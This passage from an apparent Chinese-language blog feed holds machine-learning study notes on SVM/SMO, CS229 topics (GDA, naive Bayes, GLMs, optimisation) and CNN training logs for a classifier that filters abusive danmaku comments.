\max_\alpha &amp;&amp;W(\alpha) = \sum^m_{i=1}\alpha_i -\frac{1}{2}\sum^m_{i,j=1}y^{(i)}y^{(j)}\alpha_i\alpha_j\langle x^{(i)},x^{(j)}\rangle \\<br>
s.t. &amp;&amp;0\leq \alpha_i \leq C,\ \ i=1,\cdots,m \\<br>
&amp;&amp;\sum^m_{i=1}\alpha_iy^{(i)}=0 \\<br>
\end{eqnarray}$$</p>
<p>假设我们使 $\alpha_i$ 都符合公式(16)、(17)的约束。现在，如果我们将 $\alpha_2,\cdots,\alpha_m$ 都固定，并使用坐标上升算法来尝试优化目标函数，你觉得这能产生效果吗？并不能。因为我们有一个约束是这样的</p>
<p>$$ \alpha_1y^{(1)} = -\sum^m_{i=2}\alpha_iy^{(i)}$$</p>
<p>两边同乘以 $y^{(1)}$</p>
<p>$$\alpha_1 = -y^{(1)}\sum^m_{i=2}\alpha_iy^{(i)}$$</p>
<p>因此，如果你固定了 $\alpha_2,\cdots,\alpha_m$，实际上你也固定了 $\alpha_1$。所以如果我们需要通过 $\alpha_i$ 来优化目标函数，我们需要同时使用其中的两项来进行优化，也就是我们 SMO 算法的主要思想</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbffwqodhj30xk05ygmb.jpg" alt=""></p>
<p>我们使用 SMO 算法有一个重要的原因，那就是 $\alpha_i, \alpha_j$ 的计算非常简单。
首先，我们通过计算剩余项的和，可以写出以下约束
$$\alpha_1y^{(1)}+\alpha_2y^{(2)}=-\sum^m_{i=3}\alpha_iy^{(i)}$$</p>
<p>使等号右边等于一个常数 $\zeta$，则我们有</p>
<p>$$ \begin{equation}\alpha_1y^{(1)}+\alpha_2y^{(2)} = \zeta \end{equation} $$</p>
<p>并且，根据新的 KKT 条件公式(12-14) $\alpha_i$ 的取值范围被固定在了 $[0,C]$，则我们可以画出以下图像
<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbffv3pgnj30gy096aa6.jpg" alt=""></p>
<p>并且根据公式(18) ，我们发现能够将原优化目标写成以下形式的二次函数</p>
<p>$$a\alpha_2^2 + b\alpha_2+c$$</p>
<p>则我们先计算得出 $\alpha_2$ 的最优值，再根据上图的值域限制进行一个修剪 (clip)</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbffs1uqtj30xk05ygmb.jpg" alt=""></p>
<p>以此得到符合限制条件的新 $\alpha_2$ 值。</p>
]]></content>
		</item>
		
		<item>
			<title>CS229 学习笔记 Part 2</title>
			<link>https://yinzo.github.io/posts/cs229-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-part-2/</link>
			<pubDate>Wed, 07 Jun 2017 00:20:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/cs229-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-part-2/</guid>
			<description>对于一个分类任务，判别式和生成式分别代表了两种不同的思路： 通过直接从输入数据中学习，得到一个『特定输入对应的实际类别』的概率模型，模型的参数</description>
			<content type="html"><![CDATA[<!-- raw HTML omitted -->
<p>对于一个分类任务，判别式和生成式分别代表了两种不同的思路：</p>
<!-- raw HTML omitted -->
<p>通过直接从输入数据中学习，得到一个『特定输入对应的实际类别』的概率模型，模型的参数为 $\theta$ 。即学习建模 $p(y\mid x)$</p>
<!-- raw HTML omitted -->
<p>通过对每一个类进行建模，然后就可以通过条件概率算出输入的数据更可能由哪一类生成。即学习建模 $p(x\mid y)$ 和 $p(y)$ ，然后计算 $$\arg\max\limits_y\frac{p(x \mid y)p(y)}{p(x)}$$</p>
<p>并且实际计算中，分母 $p(x)$ 并不会影响各个类别概率的排序，所以最终简化成 $$\arg\max\limits_y p(x \mid y)p(y)​$$</p>
<!-- raw HTML omitted -->
<p>作为生成式模型的第一个例子，它假设数据的分布 $p(x\mid y)$ 是多元高斯分布 (multivariate normal distribution)，分类结果为二分类，即 $y \sim \mathrm{Bernoulli}(\phi)$。</p>
<p>根据生成式模型的思路，它通过训练数据，计算出两个类的隐含分布——多元高斯分布的参数 $\mu_0, \mu_1,\Sigma$ （需要注意的是，这里对于两个多元正态分布的 $\Sigma$，我们使用的是一个公共的参数，也就是我们假设两个分布的『形状』是一样的），以及对于分类结果的伯努利分布参数 $\phi$</p>
<p>根据定义，我们可以得到以下模型</p>
<p>$$p(y) = \phi^y(1-\phi)^{1-y}$$</p>
<p>$$p(x\mid y=0) = \frac{1}{(2\pi)^{n/2}|\Sigma|^{1/ 2}} \exp\left(-\frac{1}{2}(x-\mu_0)^T\Sigma^{-1}(x-\mu_0)\right)$$</p>
<p>$$p(x\mid y=1) = \frac{1}{(2\pi)^{n/2}|\Sigma|^{1/ 2}} \exp\left(-\frac{1}{2}(x-\mu_1)^T\Sigma^{-1}(x-\mu_1)\right)$$</p>
<p>接下来开始估计各个参数的值。我们使用一个新的似然函数 <strong>Joint likelihood</strong></p>
<p>$$\ell(\phi, \mu_0, \mu_1, \Sigma) = log \prod^m_{i=1} p(x^{(i)}, y^{(i)}; \phi, \mu_0, \mu_1, \Sigma)$$</p>
<p>$$\phantom{ \ell(\phi, \mu_0, \mu_1, \Sigma)} = log \prod^m_{i=1} p(x^{(i)}\mid y^{(i)}; \mu_0, \mu_1, \Sigma)p(y^{(i)};\phi)$$</p>
<p>通过最大化此似然函数，我们能够得到以上几个参数的估计值</p>
<p>$$\phi = \frac{1}{m}\sum^m_{i=1}1{y^{(i)}=1}$$</p>
<p>$$\mu_0 = \frac{\sum^m_{i=1}1{y^{(i)} = 0}x^{(i)}}{\sum^m_{i=1}1{y^{(i)} = 0}}$$</p>
<p>$$\mu_1 = \frac{\sum^m_{i=1}1{y^{(i)} = 1}x^{(i)}}{\sum^m_{i=1}1{y^{(i)} = 1}}$$</p>
<p>$$\Sigma = \frac{1}{m}\sum^m_{i=1}(x^{(i)}-\mu_{y^{(i)}})(x^{(i)}-\mu_{y^{(i)}})^T$$</p>
<p>而 GDA 的判别公式则是作为作业的一部分自行完成。</p>
<!-- raw HTML omitted -->
<p>GDA 的判别公式能够化为以下形式
$$p(y=1\mid x;\phi, \Sigma, \mu_0, \mu_1) = \frac{1}{1+\exp(-\theta^Tx)}$$</p>
<p>也就是 Logistic 回归的形式。（这个公式转化的具体过程是课后习题的一部分）</p>
<p>其中 $\theta$ 是关于 $\phi,\Sigma,\mu_0,\mu_1$ 的函数。那么 GDA 和 Logistic 回归（下称 LR）的区别在哪里呢？</p>
<p>假设 $p(x\mid y)$ 满足多元高斯分布，那么 $p(y\mid x)$ 能够写成 logistic 函数的形式。但是，反之并不成立。$p(y\mid x)$ 能够写成 logistic 函数的形式并不意味着 $p(x\mid y)$ 符合多元高斯分布。这说明，GDA 做出了一个更强的假设 (stronger modeling assumption)。</p>
<p>并且，当这个假设符合现实（ $p(x\mid y)$ 符合多元高斯分布 ），并且在训练集足够大的情况下，没有其他算法优于 GDA1。而且通常来说，对于一个较小的训练集，我们通常会觉得 GDA 会表现的更好。</p>
<p>反过来说，对于使用了较弱假设的 LR，它拥有更强的鲁棒性，对于错误的模型假设也更不敏感。对 $p(x\mid y)$ 分布的假设，有很多种情况能够使得 $p(y\mid x)$ 可以化为 Logistic 函数的形式。比如说，$x \mid y = 0$ 和 $x \mid y = 1$ 分别符合两个独立的泊松分布时既是如此。</p>
<!-- raw HTML omitted -->
<p>对于一个文本分类问题，使用50000个词的简化词袋模型时，我们的目标是对 $p(x_1,\cdots,x_{50000}\mid y)$ 构建出最准确的模型。</p>
<p>$$p(x_1,\cdots,x_{50000}\mid y)$$</p>
<p>$$ = p(x_1\mid y)p(x_2\mid y,x_1)p(x_3\mid y,x_1,x_2)\cdots p(x_{50000}\mid y,x_1,x_2,\cdots,x_{49999})$$</p>
<p>此时的式子称为贝叶斯分类器。而朴素贝叶斯和贝叶斯的区别在于哪里呢？关键就在于以下假设：</p>
<p><strong>朴素贝叶斯假设：假设 $x_i$ 条件独立于 $y_i$</strong></p>
<p>则原概率公式</p>
<p>$$ = p(x_1\mid y)p(x_2\mid y)p(x_3\mid y)\cdots p(x_{50000}\mid y)$$</p>
<p>此时的式子就称为朴素贝叶斯分类器了。虽然朴素贝叶斯假设是一个很强的假设 (strong assumption)，但是它出人意料的在很多问题上都表现的不错。
使用朴素贝叶斯概率公式，则词袋中的每个词，对于每种文本分类都属于一个独立参数的伯努利分布。即此例子中，词袋大小50000，2种文本分类，于是共有 100,000 个伯努利分布参数需要估计，以及一个对于类别 y 的伯努利分布参数 $\phi_y$。</p>
<p>我们使用 Joint likelihood 作为目标函数</p>
<p>$$ \mathcal{L}(\phi_y, \phi_{j\mid y=0}, \phi_{j\mid y=1}) = \prod^m_{i=1}p(x^{(i)}, y^{(i)})$$</p>
<p>最大化似然函数得到各个参数的估计</p>
<p>$$j \in {1,2,\cdots,50000}$$</p>
<p>$$ \phi_{j\mid y=1} = \frac{\sum^m_{i=1}\operatorname{1}{x_j^{(i)} = 1 \wedge y^{(i)} = 1 }}{\sum^m_{i=1}\operatorname{1}{ y^{(i)} = 1 }} $$</p>
<p>$$\phi_{j\mid y=0} = \frac{\sum^m_{i=1}\operatorname{1}{x_j^{(i)} = 1 \wedge y^{(i)} = 0 }}{\sum^m_{i=1}\operatorname{1}{ y^{(i)} = 0 }}$$</p>
<p>$$\phi_y = \frac{\sum^m_{i=1}\operatorname{1}{ y^{(i)} = 1 }}{m}$$</p>
<p>朴素贝叶斯的判别公式如下：</p>
<p>$$p(y=1\mid x) = \frac{p(x\mid y =1)p(y=1)}{p(x)}$$</p>
<p>$$ = \frac{(\prod^n_{i=1}p(x_i|y=1))p(y=1)}{(\prod^n_{i=1}p(x_i|y=1))p(y=1)+(\prod^n_{i=1}p(x_i|y=0))p(y=0)}$$</p>
<p>最后，我们能够很容易的想到，可以将 $x_i$ 的取值从二值变为多值，就成为了这个算法的泛化。为了做到这一点，我们只需要将对 $p(x_i\mid y)$ 假设的伯努利分布，替换成多项式分布即可。如果原始属性是连续值，我们也可以通过分段的办法，将他离散化。之后，就可以仿照我们上述的过程来使用朴素贝叶斯算法了。当原始的连续属性使用多元正态分布不能很好的建模时，将他离散化后使用朴素贝叶斯通常能取得更好的效果。</p>
<!-- raw HTML omitted -->
<p>上述标准的朴素贝叶斯通常情况下效果都很好，但是在一些特殊情况下会出现奇怪的情况。比如说，当你的分类器遇到了一个从来没有见过的词（不存在于训练数据中）的时候，对于这个词两个类别的概率都会等于零，并且由于累乘的结果，会使得整个输出都变为零。这显然不合理，所以这就是拉普拉斯平滑要解决的事情。</p>
<p>原理很简单，我们对于一个多项式分布输入的类别概率计算公式如下</p>
<p>$$p(z=j) = \phi_j = \frac{\sum^m_{i=1} \operatorname{1}{z^{(i)}=j}}{m}$$</p>
<p>我们想要让这个式子不等于零，很直觉的办法是在分子上加上一个很小的数。所以我们在分子上加一个 1。但是这还不够，我们需要让多项式分布的各个类整体概率和仍然为 1，即 $\sum^k_{j=1}\phi_j = 1$ 。所以我们分母也需要稍作改动，最终我们得到
$$p(z=j) = \phi_j = \frac{\sum^m_{i=1} \operatorname{1}{z^{(i)}=j}+1}{m+k}$$</p>
<p>读者可以自己验算 $\sum^k_{j=1}\phi_j = 1$</p>
<!-- raw HTML omitted -->
<p>之前的模型我们称为『多变量伯努利分布事件模型』<!-- raw HTML omitted --><!-- raw HTML omitted -->2<!-- raw HTML omitted --><!-- raw HTML omitted -->，而对于文本分类的任务，接下来这个模型通常能够取得更好的效果，称为『多项式分布事件模型』<!-- raw HTML omitted --><!-- raw HTML omitted -->3<!-- raw HTML omitted --><!-- raw HTML omitted -->。</p>
<p>在这个模型中，一个由 n 个词组成的文本段将化为一个 n 维向量，每一维符合都一个相同的多项式分布，多项式分布一个选项对应一个特定的词。比如一个电子邮件内容为『快来 购买……』，在多项式分布中，快来对应的类别编号为33，购买的类别编号为580，则形成的输入向量就是 [33, 580, …]</p>
<p>文本段中每一个词的分布都来自同一个多项式分布，需要注意的是，词在文中的位置并不影响他的取值分布。</p>
<p>则似然函数定义如下
$$\mathcal{L}(\phi, \phi_{k\mid y=0}, \phi_{k\mid y=1}) = \prod^m_{i=1}p(x^{(i)}，y^{(i)})$$</p>
<p>$$= \prod^m_{i=1}\left( \prod^{n_i}_{j=1}p(x_j^{(i)}\mid y;\phi_{k\mid y=0},\phi_{k\mid y=1}) \right)p(y^{(i)};\phi_y)$$</p>
<p>最大化似然函数得到参数估计</p>
<p>$$\phi_{k\mid y=1} = \frac{\sum^m_{i=1}\sum^{n_i}_{j=1} \operatorname{1}{x_j^{(i)} = k\wedge y^{(i)} = 1 } }{\sum^m_{i=1} \operatorname{1}{ y^{(i)} = 1} n_i}$$</p>
<p>$$\phi_{k\mid y=0} = \frac{\sum^m_{i=1}\sum^{n_i}_{j=1} \operatorname{1}{x_j^{(i)} = k\wedge y^{(i)} = 0 } }{\sum^m_{i=1} \operatorname{1}{ y^{(i)} = 0} n_i}​$$</p>
<p>$$\phi_y = \frac{\sum^m_{i=1}\operatorname{1}{y^{(i)} = 1}}{m}$$</p>
<p>多项式分布事件模型和之前的模型的不同点在于，新模型除了统计某一个词是否出现，还考虑了某一个词出现的次数。</p>
<!-- raw HTML omitted -->
]]></content>
		</item>
		
		<item>
			<title>CS229 学习笔记 Part 1</title>
			<link>https://yinzo.github.io/posts/cs229-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-part-1/</link>
			<pubDate>Fri, 12 May 2017 23:14:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/cs229-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-part-1/</guid>
			<description>此笔记为我的 CS229 的学习笔记之一，由 Andrew Ng 的 CS229 Lecture notes 和 课堂录像整理而来。用于记录所学到的内容。记录顺序重新编排过，并非是课程原本的教学顺序，并且省略</description>
			<content type="html"><![CDATA[<p>此笔记为我的 CS229 的学习笔记之一，由 Andrew Ng 的 CS229 Lecture notes 和 课堂录像整理而来。用于记录所学到的内容。记录顺序重新编排过，并非是课程原本的教学顺序，并且省略了课程中的一些推导过程，所以适合学习后整理备忘使用，不适合用于同步辅助学习。</p>
<!-- raw HTML omitted -->
<p>广义线性模型是所学到的 Linear Regression 以及 Logistic Regression 的推广形式（更准确的说，这两种模型都属于 GLM 的特殊情况）。它有三个关键假设(Assumptions)构成:</p>
<ol>
<li>$ y \mid x;\theta\sim ExponentialFamily(\eta) $ ：对于固定的参数 $\theta$ 以及给定 $x$， $y$ 的分布服从某一指数分布族（如高斯分布、伯努利分布、Softmax分布）</li>
<li>对于给定的 $x$ ，目标是预测 $T(y)$ 的值。换一种说法就是，我们定义假设函数 $h(x) = E[y\mid x]$</li>
<li>natural parameter $\eta$ 和 输入 $x$ 是线性相关的， $\eta = \theta^ \mathrm{ T } x$ （其中，当输入 $x$ 和 $\eta$ 是向量的时候， $\eta_i = \theta_i^ \mathrm{T}x$）</li>
</ol>
<p>以上三个假设，一般只有第一个需要我们决定所使用的分布，其他两个假设都是直接定义。关键的地方来了，通过选择不同的_指数分布族_分布，我们能够得到不同的模型：</p>
<ul>
<li>高斯分布，则得到 Linear Regression</li>
<li>伯努利分布，则得到 Logistic Regression</li>
<li>Softmax 分布，得到 Softmax Regression</li>
</ul>
<p>其中，Lenear Regression 为回归模型 (regression)， Logistic Regression 和 Softmax Regression 都是分类模型 (classification)。</p>
<p>则我猜测，是否根据所假设的分布是离散分布还是连续分布，分别能够得到分类模型和回归模型呢？有待后续的学习验证。</p>
<!-- raw HTML omitted -->
<ol>
<li>假设 $y$ 服从的分布，并将所假设的分布化为标准的指数分布族标准形式：$$ p(y;\eta) = b(y)\exp(\eta^\mathrm{T}T(y)-a(\eta))$$</li>
<li>使用 $\eta$ 表示出 $E[y\mid x;\theta]$，则我们得到了使用 $\eta$ 表示的假设函数 $h_\theta(\eta)$</li>
<li>根据假设3，$\eta = \theta^ \mathrm{ T } x$，直接代入假设函数，得到 $h_\theta(x)$</li>
</ol>
<p>之后：</p>
<ol>
<li>通过得到的假设函数，我们能够定义出代价函数 (Cost function) 或 似然函数 (likelihood)</li>
<li>通过优化方法如梯度下降、牛顿法，以最小化代价函数或者最大化似然函数，得到最优的 $\theta$ 值。</li>
</ol>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>包括以下三种子类：</p>
<ul>
<li>Batch Gradient Descent</li>
<li>Mini-batch Gradient Descent</li>
<li>Stochastic Gradient Descent</li>
</ul>
<p>三种方法的主要区别在于，每一步优化所使用的样本数量大小：</p>
<ul>
<li>Batch 使用__全部__样本计算平均梯度后才进行一步更新；</li>
<li>Mini-batch 使用__一小部分__样本计算平均梯度就进行一步更新；</li>
<li>Stochastic 使用__一个__样本，计算梯度，进行更新</li>
</ul>
<!-- raw HTML omitted -->
<p>牛顿法用于寻找函数零点位置的优化方法，使用函数的导数（梯度）来计算参数的变化量，从而更新参数</p>
<p>由于我们需要寻找函数的极大值（极小值），则我们可以通过牛顿法寻找原函数的一阶导数的零点，将优化问题转化为寻找零点问题，以此来寻找原函数的极大值（极小值）。</p>
<p>牛顿法在二维的参数更新公式为：</p>
<p>$$\theta := \theta - \Delta$$
$$\Delta = \frac{f^\prime(\theta)}{f^{\prime\prime}(\theta)}$$</p>
<p>多维时，参数更新公式变为：</p>
<p>$$\theta := \theta - H^{-1}\nabla_\theta \ell(\theta)$$</p>
<!-- raw HTML omitted -->
<p>简单的模型介绍就不说了，只记录这门课程给我额外学习到的一些知识点。</p>
<p>首先是 Linear Regression 使用的是最小平方误差法 LMS 来进行函数优化并寻找最优 $\theta$ 值的。在我第一次学习到这个方法的时候，仅仅是觉得这个误差函数很有道理，感觉能说得过去，并没有理解其背后的理论基础。</p>
<p>Andrew Ng 使用概率学上的解释，告诉了我，为什么使用最小平方误差法。</p>
<p>我们使用假设函数 $h(x) = \theta^\mathrm{T}x^{(i)}$ 来作为给定输入 $x$ 时，对 $y$ 的预测，则我们可以得到这样一个等式</p>
<p>$$y^{(i)} = \theta^\mathrm{T}x^{(i)} + \epsilon^{(i)}$$</p>
<p>$\epsilon^{(i)}$ 是误差项，包括了未被找到的特征或随机噪声。此时，我们假设：</p>
<ol>
<li>误差都是独立同分布的</li>
<li>误差项符合高斯分布</li>
</ol>
<p>则有$\epsilon^{(i)}\sim \cal{N}(0,\sigma^2) $，即 $y^{(i)} - \theta^\mathrm{T}x^{(i)}\sim \cal{N}(0,\sigma^2) $</p>
<p>省略一部分推导，我们能够得到对数似然函数</p>
<p>$$\ell (\theta) = m\log \frac{1}{\sqrt{2\pi}\sigma} - \frac{1}{\sigma^2}\cdot\frac{1}{2}\sum_{i=1}^{m} (y^{(i)} - \theta^\mathrm{T}x^{(i)})^2$$</p>
<p>则当我们最大化对数似然函数时，即最小化</p>
<p>$$\frac{1}{2}\sum_{i=1}^{m}(y^{(i)} - \theta^\mathrm{T}x^{(i)})^2$$</p>
<p>即最小化平方误差。</p>
<p>最终我们得到结论：当我们对数据的分布进行以上假设时，最大化对数似然函数相当于最小化平方误差。</p>
<!-- raw HTML omitted -->
<p>这是一种 Linear Regression 的特殊形式，它在误差函数中增加了一项权重，变为$\sum_i w^{(i)}(y^{(i)} - \theta^\mathrm{T}x^{(i)})^2$</p>
<p>其中 $w^{(i)}$ 就是非负权重，对于需要重点拟合的区域 $w^{(i)}$ 会比较大。$w^{(i)}​$ 并不需要满足和为1的约束，因为他不是概率分布，只是单纯的惩罚项。</p>
<p>通常来说，对于权重 $w^{(i)}​$ 的选择，我们使用以下函数</p>
<p>$$w^{(i)} = \exp(-\frac{(x^{(i)} - x)^2}{2\tau^2})$$</p>
<p>需要注意的是，这个函数和高斯分布没有关系，仅仅是常规的钟形函数而已。参数 $\tau$ 影响了当远离所求点 $x$ 时权值下降的速度。</p>
<p>则对于权重较大的区域，所求得的曲线拟合程度较高。这一方法在预测的时候，通常将待预测区域的权重提高，然后重新拟合曲线。所以每一次预测都需要重新拟合曲线，使得它在训练样本较大时效率比较低。</p>
]]></content>
		</item>
		
		<item>
			<title>原始模型优化笔记</title>
			<link>https://yinzo.github.io/posts/%E5%8E%9F%E5%A7%8B%E6%A8%A1%E5%9E%8B%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/</link>
			<pubDate>Wed, 01 Mar 2017 17:04:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E5%8E%9F%E5%A7%8B%E6%A8%A1%E5%9E%8B%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/</guid>
			<description>原始模型优化笔记 400:Nice at epoch 38, validation acc 96.56% 200:Nice at epoch 37, validation acc 95.22% 100:Nice at epoch 34, validation acc 94.78%单轮训练时间与50维相近，测试样例测试耗时 0.92secs 50:Nice at epoch 40, validation acc 94.39%单轮</description>
			<content type="html"><![CDATA[<h1 id="原始模型优化笔记">原始模型优化笔记</h1>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<ul>
<li>400:Nice at epoch 38, validation acc 96.56%</li>
<li>200:Nice at epoch 37, validation acc 95.22%</li>
<li>100:Nice at epoch 34, validation acc 94.78%单轮训练时间与50维相近，测试样例测试耗时 0.92secs</li>
<li>50:Nice at epoch 40, validation acc 94.39%单轮训练时间在7秒左右，测试样例(av 8365806)测试耗时 0.7secs</li>
</ul>
<!-- raw HTML omitted -->
<p>在两个 conv 层之间和两个 fc 层之间各加入了一个 \(p=0.5\) 的 dropout</p>
<p>40 epoch 时只有 89.1 acc， 和预想的一样，会导致 达到最佳效果的 epoch 数上升。</p>
<p>用了 dropout 后一个很明显的变化是，原本训练过程中通常是train acc 高于 validation acc，现在通常是 validation acc 高于 train acc，训练后期才基本持平或反超</p>
<p>vector在 epoch 90 左右 达到了96.50%上下的 acc，最终在epoch 300 以上能达到 97.10% 左右的 acc</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbg45n7rij30uo0e8jt3.jpg" alt="屏幕快照 2017-02-24 22.15.27"></p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>人工检查实际识别效果，仍有少量漏网。果然几个百分点的区别，人简单扫视还是很难看出区别的，而且还要排除安慰剂效应。</p>
<p>实验证明 dropout 确实有效防止了过拟合，并且提高了一定的分类准确度。</p>
<p>接着将几个 word2vec 长度的模型训练图都画出来对比：</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbg0icvf2j30uo0e8jt3.jpg" alt="屏幕快照 2017-03-01 16.57.28"></p>
<p>可以从左下角的 tooltip 看到，从上至下分别是词向量长度为 400、200、100、50、25 的模型，在相同迭代次数下的准确度排序。由于选取的是上述模型都仍有收敛空间的迭代数，所以这个排名一定程度上可以代表模型训练所需的迭代次数排序。</p>
<p>由此可以得出结论，词向量维数越多，模型收敛所需的迭代次数越少，但是最终收敛的效果没有变化，这可能是目前训练样本较少的原因。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbfx7ss94j30rl0hydje.jpg" alt="屏幕快照 2017-03-01 17.01.36"></p>
<p>切换到训练时间为横轴的图来看，收敛速度实际上是100维最快，这倒是出乎意外，原本以为会是低维模型最快，结果发现，100维由于单次迭代提升更大，虽然迭代速度稍慢但是总体收敛最快。我还特地检查了100维的data graph，确定的确是在用100维的词向量来训练的。</p>
<!-- raw HTML omitted -->
<p>这个问题我找到了 <a href="https://www.reddit.com/r/MachineLearning/comments/42nnpe/why_do_i_never_see_dropout_applied_in/">Reddit 的这个讨论串</a></p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>卷积层的参数数量没有全连接层那么多，所以不那么需要 regularizaion</p>
</li>
<li>
<p>卷积层 filter map 的梯度是对于整个样本进行平均化的<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->，这样会使得卷积核原本存在相关性的参数，在样本的不同位置使用了不同的 dropout mask，导致 dropout 无效。当然，你可以想办法使卷积核的 dropout mask 在同一层中固定，但是这又会导致 regularizaion 过强。</p>
</li>
<li>
<p>Srivastava/Hinton 在 dropout 的论文中也有提到：在卷积层加入 dropout 的效果等于没有 \((3.02\% \rightarrow 2.55\%)\)，因为卷积层的参数太少了，不存在过拟合的问题，所以 dropout 几乎没有效果。但是 dropout 在较低的层仍是有用的，它的效果相当于产生一点噪声，使得后面层数较高的全连接层避免过拟合。</p>
</li>
<li>
<p>在卷积层使用 dropout 也不是绝对没有的，以下几篇论文中就有用到：</p>
<ul>
<li><a href="http://arxiv.org/pdf/1511.07289v3.pdf">http://arxiv.org/pdf/1511.07289v3.pdf</a></li>
<li><a href="http://torch.ch/blog/2015/07/30/cifar.html">http://torch.ch/blog/2015/07/30/cifar.html</a></li>
<li><a href="http://danielnouri.org/notes/2014/12/17/using-convolutional-neural-nets-to-detect-facial-keypoints-tutorial/">http://danielnouri.org/notes/2014/12/17/using-convolutional-neural-nets-to-detect-facial-keypoints-tutorial/</a></li>
</ul>
<p>但是他们都有卷积层的 dropout 『keep_prob 较大』的特点。</p>
</li>
</ul>
<!-- raw HTML omitted -->
<p>先测试了卷积层不使用 dropout 的效果<br>
<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbg46ayvyj30us0cv0u8.jpg" alt="屏幕快照 2017-02-27 13.11.43"></p>
<p>绿线是没有 卷积层dropout 的 acc， 紫线是卷积层 p=0.5 dropout 的 acc，两者都有一个 p=0.5 的全连接 dropout。由此可得卷积层的 dropout 还是有效果的，首先防止过拟合的程度要更高，其次对于准确度的提升也是有的 \((\uparrow2.3\%)\)</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbfzmxsw3j315k0ji78w.jpg" alt="屏幕快照 2017-03-01 15.45.56"></p>
<p>卷积层 p=0.6 和 p=0.4 dropout 的测试，相比 p=0.5 的模型，收敛速度、收敛精度都没有明显的区别。</p>
<!-- raw HTML omitted -->
<p>先在卷积层和全连接层之间加入一个大小为2的 <code>max_pooling1d</code><br>
<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbg4607imj30uo0e8jt3.jpg" alt="屏幕快照 2017-02-26 16.54.23"></p>
<p>可以看到，这个 max_pool 对于最终收敛精度没有影响，在前期略微加快了收敛，但是中期减慢了收敛。</p>
<p>尝试移动该 pooling 层到两个卷积层之间。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbfx33fvnj30uv0ju77z.jpg" alt="屏幕快照 2017-02-28 13.42.28"></p>
<p>上图为多次测试的结果。收敛速度和收敛准确率没有较为明显的提高或降低 \((96.623\% \rightarrow 96.694\%)\)，只有训练速度有略微的提高。</p>
<p>值得一提的是，加入了 max-pool 的模型在高迭代次数的时候，标准差在逐渐增大。我认为这是因为 max-pool 一定程度上降低了训练样本的精度，相当于训练样本变少了，于是乎少量增加了整个模型在高迭代次数过拟合的风险。这里我选择使用84次迭代的模型，也就是图中横坐标约为 1k 的位置。相对来说过拟合的程度应该是非常小的。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbg40j5zyj30us0cv0u8.jpg" alt="屏幕快照 2017-02-26 18.49.29"></p>
<!-- raw HTML omitted -->
]]></content>
		</item>
		
		<item>
			<title>低素质弹幕分类器 CNN 训练笔记</title>
			<link>https://yinzo.github.io/posts/%E4%BD%8E%E7%B4%A0%E8%B4%A8%E5%BC%B9%E5%B9%95%E5%88%86%E7%B1%BB%E5%99%A8-cnn-%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/</link>
			<pubDate>Mon, 06 Feb 2017 14:48:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E4%BD%8E%E7%B4%A0%E8%B4%A8%E5%BC%B9%E5%B9%95%E5%88%86%E7%B1%BB%E5%99%A8-cnn-%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/</guid>
			<description>低素质弹幕分类器 CNN 训练笔记 完成训练后，乍一看准确率很高，结果 print 出来看一下，低素质弹幕完全没有被过滤，完全是将分类全部丢给 positive 达到的高准确率 (0.98) 的</description>
			<content type="html"><![CDATA[<h1 id="低素质弹幕分类器-cnn-训练笔记">低素质弹幕分类器 CNN 训练笔记</h1>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>完成训练后，乍一看准确率很高，结果 print 出来看一下，低素质弹幕完全没有被过滤，完全是将分类全部丢给 positive 达到的高准确率 (0.98) 的确是 meaningless classification<br>
并且这个结果在loss里看得很清楚，loss一直是处于15+的</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>尝试增加第二个卷积层的节点数，然而训练并没有明显变好</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>然后加大了FC层的隐节点，瞬间loss开始猛降，最后降到了0.3左右，print 出来一看，的确效果不错，但是有一部分语句较短的低素质的弹幕没有被识别出来。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>然后由于感觉最后一次迭代没有收敛到极致，尝试加大迭代次数看看这个模型的极限如何。</p>
<p>设置迭代100次后。</p>
<pre><code>Epoch 100/100
2999/2999 [==============================] - 9s - loss: 3.7457e-04 - acc: 1.0000
</code></pre>
<p>虽然 acc 和 loss 都到了令人发指的地步，但是发现训练集和测试集忘记shuffle了。。<br>
但是还是看了一眼测试结果，骂人弹幕的识别率为意料之中的0，因为全都被判定为普通弹幕了。shuffle之后重新训练看看吧，先迭代10次，看看效果，然后再测试100次的过拟合程度</p>
<p>10次的结果是准确率在92.45左右，人工检测的结果还可以，检测出了一部分，但是不够理想，调整的迭代20次看看。</p>
<pre><code>Epoch 20/20
2999/2999 [==============================] - 9s - loss: 0.0689 - acc: 0.9810

Correct: 1918
Incorrect: 83
Accuracy: 95.852
</code></pre>
